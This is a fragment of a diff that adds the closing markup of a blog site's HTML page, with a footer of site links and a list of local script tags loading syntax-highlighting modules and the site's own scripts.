+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
